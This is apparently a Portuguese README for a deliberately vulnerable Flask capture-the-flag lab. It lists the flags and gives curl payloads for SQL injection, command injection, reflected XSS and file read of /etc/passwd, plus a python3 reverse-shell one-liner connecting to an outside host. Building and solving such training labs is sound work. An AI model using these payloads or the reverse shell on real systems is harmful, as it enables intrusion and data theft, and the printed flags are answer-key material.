# webvuln — Web App vulnerável (Fácil)

App Flask com 5 falhas clássicas. Flags nas tabelas e em `/flag.txt`.

## Flags
- `CYBERLAB{w3b_pwn3d_c0ngr4tz}` — `/flag.txt` (via command injection)
- `CYBERLAB{sql1_un10n_xtr4ct}` — tabela `secrets` (via SQLi)

## Rotas e falhas

| Rota | Falha |
|---|---|
| `/login` | SQLi auth bypass |
| `/search?q=` | SQLi UNION-based |
| `/ping?host=` | command injection |
| `/greet?name=` | XSS refletido |
| `/read?file=` | LFI / path traversal |

## 1) SQLi (auth bypass) — `/login`

```bash
curl -s "http://IP/login" --data "u=' OR '1'='1&p=x"
```

## 2) SQLi (UNION) — `/search`

```bash
curl -s "http://IP/search?q=' UNION SELECT flag,2 FROM secrets-- -"
# -> CYBERLAB{sql1_un10n_xtr4ct}
```

## 3) Command injection — `/ping`

```bash
curl -s "http://IP/ping?host=127.0.0.1;id"
# -> uid=0(root)
curl -s "http://IP/ping?host=127.0.0.1;cat /flag.txt"
# -> CYBERLAB{w3b_pwn3d_c0ngr4tz}
```

Reverse shell (o alvo tem python3):

```bash
curl -sG "http://IP/ping" --data-urlencode \
  "host=127.0.0.1;python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"172.30.0.2\",9001));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'"
```

## 4) XSS — `/greet`

```bash
curl -s "http://IP/greet?name=<script>alert(1)</script>"
```

## 5) LFI — `/read`

```bash
curl -s "http://IP/read?file=/etc/passwd"
```